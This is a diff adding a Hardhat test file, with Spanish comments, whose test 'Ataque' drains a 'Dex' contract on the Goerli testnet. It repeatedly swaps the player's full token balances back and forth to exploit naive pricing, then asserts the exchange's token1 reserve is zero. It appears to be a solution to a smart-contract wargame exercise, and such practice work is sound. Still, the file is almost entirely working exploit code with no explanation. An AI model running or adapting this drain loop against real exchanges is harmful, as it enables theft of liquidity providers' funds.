@@ -1,0 +1,92 @@
+const { expect, assert } = require("chai");
+const { ethers } = require("hardhat");
+const { api_key, } = require('../secrets.json');
+
+describe("Dex", function () {
+	let contract, provider, first_account, another_account;
+	let dex_address = false;
+
+	beforeEach(async function () {
+		dex_address = "0x6457A42cbD3CcF8D3809B5eE15f6eBC9622f56eB";
+		[first_account, another_account] = await ethers.getSigners();
+		if (dex_address) {
+			contract = await ethers.getContractAt("Dex", dex_address);
+			provider = new ethers.providers.AlchemyProvider(network="goerli", api_key);
+		} else {
+			// const Dex = await ethers.getContractFactory("Dex");
+			// contract = await Dex.deploy();
+            // await contract.deployed();
+			// dex_address = contract.address;
+
+            // const Token = await ethers.getContractFactory("Token");
+			// token1_contract = await Token.deploy(dex_address, "Token1", "TKN1", 110);
+            // token2_contract = await Token.deploy(dex_address, "Token2", "TKN2", 110);
+
+            // let tx = await contract.setTokens(token1_contract.address, token2_contract.address);
+            // await tx.wait();
+
+            // tx = await contract.addLiquidity(token1_contract.address, 100);
+            // await tx.wait();
+
+            // tx = await contract.addLiquidity(token2_contract.address, 100);
+            // await tx.wait();
+
+
+			// provider = new ethers.providers.getDefaultProvider("http:/\/localhost:8545");
+		}
+		console.log("Contract address: ", dex_address);
+	});
+
+	it("Ataque", async function () {
+        let token1Address = await contract.token1();
+        let token2Address = await contract.token2();
+
+        dexBalanceToken1 = await contract.balanceOf(token1Address, dex_address);
+        console.log("Dex Token1 balance", dexBalanceToken1);
+        dexBalanceToken2 = await contract.balanceOf(token2Address, dex_address);
+        console.log("Dex Token2 balance", dexBalanceToken2);
+
+        try {
+            while (dexBalanceToken2 > 0 || dexBalanceToken1 > 0) {
+                //obtener el balance de token2, y hacer swap por token 1
+                playerBalanceToken2 = await contract.balanceOf(token2Address, first_account.address);
+                console.log("Player Token2 balance", playerBalanceToken2);
+
+                tx = await contract.approve(dex_address, playerBalanceToken2);
+                await tx.wait();
+                tx = await contract.swap(token2Address, token1Address, playerBalanceToken2);
+                await tx.wait();
+
+                // obtener el balance de token1, y hacer swap por token 2
+                playerBalanceToken1 = await contract.balanceOf(token1Address, first_account.address);
+                console.log("Player Token1 balance", playerBalanceToken1);
+                tx = await contract.approve(dex_address, playerBalanceToken1);
+                await tx.wait(); 
+                tx = await contract.swap(token1Address, token2Address, playerBalanceToken1);
+                await tx.wait();
+
+                dexBalanceToken1 = await contract.balanceOf(token1Address, dex_address);
+                console.log("Dex Token1 balance", dexBalanceToken1);
+                dexBalanceToken2 = await contract.balanceOf(token2Address, dex_address);
+                console.log("Dex Token2 balance", dexBalanceToken2);
+            }
+        } catch (e) {
+            console.log("Not enough to swap, trying now with dex balance", dexBalanceToken2);
+            tx = await contract.approve(dex_address, dexBalanceToken2);
+            await tx.wait(); 
+            tx = await contract.swap(token2Address, token1Address, dexBalanceToken2);
+            await tx.wait();
+        }
+
+        dexBalanceToken1 = await contract.balanceOf(token1Address, dex_address);
+        console.log("Dex Token1 balance", dexBalanceToken1);
+        dexBalanceToken2 = await contract.balanceOf(token2Address, dex_address);
+        console.log("Dex Token2 balance", dexBalanceToken2);
+        expect(dexBalanceToken1).to.equal(0);
+
+	});
+
+	afterEach(async function() {
+		// COMPLETAR
+	});
+});
